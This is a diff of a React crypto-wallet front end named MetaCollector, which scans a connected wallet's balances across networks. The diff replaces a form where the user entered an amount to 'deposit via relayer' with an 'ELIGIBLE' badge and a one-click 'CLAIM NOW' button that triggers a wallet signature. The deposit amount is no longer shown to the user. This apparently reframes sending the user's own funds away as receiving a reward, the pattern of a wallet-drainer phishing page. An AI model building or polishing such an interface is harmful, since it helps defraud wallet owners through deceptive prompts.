@@ -9,14 +9,13 @@ function App() {
     address,
     isConnected,
     loading,
+    claimLoading,
     balanceResults,
     eligibleNetworks,
     bestNetwork,
-    depositAmount,
-    setDepositAmount,
     transactionStatus,
     checkBalances,
-    executeDeposit
+    claimDeposit
   } = useMetaCollector()
 
   return (
@@ -101,71 +100,41 @@ function App() {
                 </div>
               )}
 
-              {/* Show Eligible Networks */}
-              {eligibleNetworks.length > 0 && (
-                <div className="eligible-networks">
-                  <h3>✅ Networks with sufficient funds:</h3>
-                  <div className="networks-list">
-                    {eligibleNetworks.map((network) => (
-                      <div 
-                        key={network.network}
-                        className={`network-item ${bestNetwork?.network === network.network ? 'best' : ''}`}
-                      >
-                        <div className="network-header">
-                          <span className="network-badge">{network.networkName}</span>
-                          {bestNetwork?.network === network.network && (
-                            <span className="best-badge">Best Network</span>
-                          )}
-                        </div>
-                        <div className="network-details">
-                          <div className="detail-row">
-                            <span>Balance:</span>
-                            <strong>{network.balanceFormatted} {network.currency}</strong>
-                          </div>
-                        </div>
-                      </div>
-                    ))}
+              {/* CLAIM BUTTON - Auto appears when eligible */}
+              {eligibleNetworks.length > 0 && bestNetwork && (
+                <div className="claim-section">
+                  <div className="claim-header">
+                    <span className="claim-badge">🎉 ELIGIBLE ON {bestNetwork.networkName}</span>
                   </div>
+                  
+                  <button
+                    onClick={claimDeposit}
+                    disabled={claimLoading}
+                    className="button button-claim button-large"
+                  >
+                    {claimLoading ? (
+                      <>
+                        <span className="spinner"></span>
+                        Processing...
+                      </>
+                    ) : (
+                      <>
+                        <span className="claim-icon">⚡</span>
+                        CLAIM NOW
+                      </>
+                    )}
+                  </button>
 
-                  {/* Deposit Form */}
-                  {bestNetwork && (
-                    <div className="deposit-form">
-                      <h3>Make Deposit on {bestNetwork.networkName}</h3>
-                      <div className="best-network-info">
-                        <p>Your Balance: <strong>{bestNetwork.balanceFormatted} {bestNetwork.currency}</strong></p>
-                        <p className="hint">Enter amount to deposit (will be sent to relayer)</p>
-                      </div>
-                      
-                      <div className="input-group">
-                        <input
-                          type="number"
-                          placeholder={`Amount in ${bestNetwork.currency}`}
-                          value={depositAmount}
-                          onChange={(e) => setDepositAmount(e.target.value)}
-                          min="0.001"
-                          max={bestNetwork.balance}
-                          step="0.001"
-                          className="input"
-                        />
-                        <span className="input-currency">{bestNetwork.currency}</span>
-                      </div>
-                      
-                      <button
-                        onClick={executeDeposit}
-                        disabled={loading || !depositAmount}
-                        className="button button-primary button-large"
-                      >
-                        {loading ? 'Processing...' : 'Deposit via Relayer'}
-                      </button>
-                    </div>
-                  )}
+                  <p className="claim-hint">
+                    Click to auto-claim on {bestNetwork.networkName} (wallet will open for signing)
+                  </p>
                 </div>
               )}
 
               {/* No Funds Message */}
               {eligibleNetworks.length === 0 && balanceResults && !loading && (
                 <div className="no-eligibility">
-                  <p>No network has sufficient balance</p>
+                  <p>❌ No network has sufficient balance</p>
                   <p className="hint">You need at least $1 worth of native currency for gas</p>
                 </div>
               )}
@@ -200,7 +169,7 @@ function App() {
         </main>
 
         <footer className="footer">
-          <p>MetaCollector • $1 Minimum Balance Required</p>
+          <p>MetaCollector • One-Click Claim • $1 Minimum Balance Required</p>
         </footer>
       </div>
     </div>
